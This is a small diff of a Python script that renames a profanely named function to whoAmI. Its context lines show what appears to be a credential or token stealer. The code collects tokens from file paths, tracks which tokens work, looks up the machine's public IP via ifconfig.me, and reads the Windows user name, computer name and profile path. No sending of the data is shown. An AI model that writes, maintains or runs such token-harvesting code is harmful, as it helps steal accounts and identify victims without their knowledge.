@@ -92,7 +92,7 @@ def getTokenz(path):
     return tokens
 
 
-def whoTheFuckAmI():
+def whoAmI():
     ip = "None"
     try:
         ip = urlopen(Request("https://ifconfig.me")).read().decode().strip()
@@ -204,7 +204,7 @@ def main():
     checked = []
     already_cached_tokens = []
     working_ids = []
-    ip = whoTheFuckAmI()
+    ip = whoAmI()
     pc_username = os.getenv("UserName")
     pc_name = os.getenv("COMPUTERNAME")
     user_path_name = os.getenv("userprofile").split("\\")[2]
